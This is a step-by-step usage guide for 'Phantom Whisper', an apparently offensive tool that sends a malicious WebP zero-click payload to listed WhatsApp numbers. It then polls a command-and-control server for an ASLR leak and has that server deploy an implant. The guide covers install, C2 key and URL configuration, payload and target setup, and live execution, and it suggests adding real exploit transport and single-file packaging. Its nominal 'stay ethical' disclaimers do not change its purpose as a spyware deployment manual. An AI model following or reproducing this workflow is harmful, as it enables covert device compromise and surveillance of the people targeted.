# Phantom Whisper — Step‑by‑Step Usage Guide

*A zero‑to‑green‑check walkthrough*

---

## 1  Prerequisites

| Requirement                 | Why                                  | Quick Check                |
| --------------------------- | ------------------------------------ | -------------------------- |
| Python 3.9 +                | Typing + `pydantic_settings` support | `python --version`         |
| `virtualenv` or `pyenv`     | Isolate deps                         | *Optional but recommended* |
| Git + GCC/Clang             | Pull & build wheels                  | `git --version`            |
| Out‑of‑scope test device(s) | Ethical testing only                 | Device IMEIs / IDs         |

---

## 2  Clone & Install

```bash
# 2.1  Clone
$ git clone https://github.com/exfil0/PhantomWhisper.git
$ cd phantom‑whisper

# 2.2  Create and activate venv
$ python -m venv .venv
$ source .venv/bin/activate

# 2.3  Install deps
$ pip install -r requirements.txt
```

---

## 3  Configure Environment

Create a file named `.env` **in the project root**:

```env
# .env
C2_API_KEY=REPLACE_WITH_REAL_KEY
```

| Variable                        | Description                              |
| ------------------------------- | ---------------------------------------- |
| `C2_API_KEY`                    | Auth token for your C2 service           |
| (Optional) `C2_SERVER_BASE_URL` | Defaults to `https://your-c2-server.com` |

---

## 4  Prepare Payload & Target List

1. Drop your **malicious WebP** into `./payloads/malicious_webp.bin`
      *Keep filename—code resolves by path.*
2. Edit `phantom_whisper/config.py` *or* append to `.env`:

   ```env
   # Comma‑separated WhatsApp IDs
   TARGET_WHATSAPP_IDS="+15551234567,+15557654321"
   ```

---

## 5  Dry‑Run Smoke Test

```bash
$ python -m phantom_whisper.orchestrator --help   # coming soon
$ python -m phantom_whisper.orchestrator          # runs with defaults
```

What to expect:

* Console log lines in plain text.
* `./logs/phantom_whisper.log` populated with JSON entries.

*No network calls will be fired until payload & targets are reachable.*

---

## 6  Live Execution

```bash
# Ensure VPN / lab network is ready
$ python -m phantom_whisper.orchestrator
```

The orchestrator will:

1. **Send Zero‑click WebP** → target device(s)
2. Poll C2 for **ASLR leak** (exponential back‑off)
3. Instruct C2 to **deploy implant** `main_implant_<os>.bin`

Exit code = number of failed targets (0 → 🎉).

---

## 7  Log & Evidence Collection

* **Human‑readable:** console output.
* **Structured:** `logs/phantom_whisper.log` (JSON per line).
* **Hash traceability:** each session includes `payload_hash` + `session_id`.

> Tip: import the JSON log into a SIEM/Grafana for timeline views.

---

## 8  Parallel Mode (Optional)

Uncomment the `ThreadPoolExecutor` block in `orchestrator.py` and set:

```python
settings.max_workers = 4  # or env var in future release
```

---

## 9  Cleanup

```bash
$ deactivate             # leave virtualenv
$ rm -rf .venv logs/*.log
```

---

## 10  Troubleshooting

| Symptom                               | Likely Cause          | Fix                                     |
| ------------------------------------- | --------------------- | --------------------------------------- |
| `requests.exceptions.ConnectionError` | Bad C2 URL / VPN down | Verify `C2_SERVER_BASE_URL`             |
| `PayloadError: not found`             | Wrong payload path    | Confirm `./payloads/malicious_webp.bin` |
| Exit code > 0                         | Some targets failed   | See `logs/` for `ERROR` lines           |

---

### 💡 Next Steps

* Swap simulated WhatsApp transport for real exploit transport.
* Add CLI arg parsing for fully headless use.
* Package with `pyinstaller` for single‑file drop && go.

— **Happy hunting & stay ethical!**
